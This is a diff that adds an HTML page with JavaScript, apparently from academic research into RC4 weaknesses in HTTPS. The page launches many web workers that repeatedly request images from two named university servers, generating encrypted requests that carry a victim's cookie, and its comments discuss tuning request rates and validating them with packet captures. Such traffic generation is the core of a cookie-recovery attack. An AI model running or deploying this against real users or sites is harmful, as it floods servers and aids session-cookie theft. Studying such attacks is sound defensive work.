@@ -1,0 +1,90 @@
+<html><head><title>RC4 Ciphertext Generation</title>
+<script type="text/javascript">
+// We're only interesting in testing #requests/seconds. Assume both sites would use the same cookie.
+// Impact of sending to two different subdomains doesn't seem high in IE 11?
+var target1 = 'https://idp.kuleuven.be/nonono.png'; // Keep-alive + supports RC4
+var target2 = 'https://webmail.cs.kuleuven.be/lala.png'; // Keep-alive but no RC4 support (FIXME: find other fast server with RC4)
+//target1 = target2;
+var worker_loc = 'worker.js';
+
+var workers = new Array();
+var i = 0;
+var noWorker = typeof Worker == "undefined" ? true : false;
+var numworkers = 80; // parameer needs to be tuned
+var totalreplies = 0;
+
+function getresults()
+{
+    console.log("Let's get the results!");
+
+    for(i = 0; i < numworkers; i = i + 1) {
+        workers[i].onmessage = function(e) {
+            totalreplies += e.data;
+            console.log(totalreplies);
+        }
+        workers[i].postMessage('lalala');
+    }
+}
+
+function showresults()
+{
+    // Divide by 30.5 because postMessage is not executed instantly (for starting and collecting
+    // results). This *underestimates* the number of requests / sconds.
+    //
+    // The correctness of this approach was confirmed in two ways:
+    // 1. By sending requests to an unencrypted website, capturing the transmitted requests using tshark
+    //    with `tshark -w test.pcapng`, and then analysing the capture in wireshark and seeing whether
+    //    the requests/seconds of JavaScript matched the real number of requests.
+    // 2. By sending encrypted HTTPS requests, and intercepting/decrypting them using Fiddler. While
+    //    fiddler slowed down the network connection substantially, it did allow us to conform for HTTPS
+    //    as well that the requests/seconds of Javascript matched those in practice.
+    //
+    // We used both methods above to confirm this code works for Internet Explorer 11 and Opera 27.
+    // The estimate given by JavaScript is actually slightly lower than the real requests/seconds!
+    //
+    // There was no measurable difference in #requests/seconds between using RC4 or AES as encryption. So while
+    // webmail.cs doesn't use RC4, we can still us it to estimate #requests/seconds possible. Using HTTPS does
+    // seens to increase CPU usage. For final paper we need to find (or setup) two RC4 servers!!
+    //
+    // Also remark that we actually send too much data. We POST 300 bytes. This is to compensate for the fact
+    // that these requests do not yet contain a cookie. Hence we're still underestimating the number of requests
+    // we can achieve. Additionally note that we can remove all other cookies except the one we want.
+    alert(totalreplies / 30.5);
+}
+
+if(!noWorker) {
+    try {
+        alert("Press OK to generate ciphertexts")
+
+        for(i = 0; i < numworkers; i = i + 2) {
+            workers[i    ] = new Worker(worker_loc);
+            workers[i    ].postMessage(target1);
+
+            workers[i + 1] = new Worker(worker_loc);
+            workers[i + 1].postMessage(target2);
+        }
+
+        setTimeout('getresults()', 30000);
+        setTimeout('showresults()', 32000);
+        console.log("Workers are running!");
+
+    } catch(e) {
+        // Debugging
+        e = e + "";
+            alert(e);
+        if(e.indexOf("Worker is not enabled") != -1) {
+            noWorker = true;
+
+        }
+    }
+}
+
+</script>
+
+</head>
+<body>
+
+The attack should be running now?
+
+</body>
+</html>
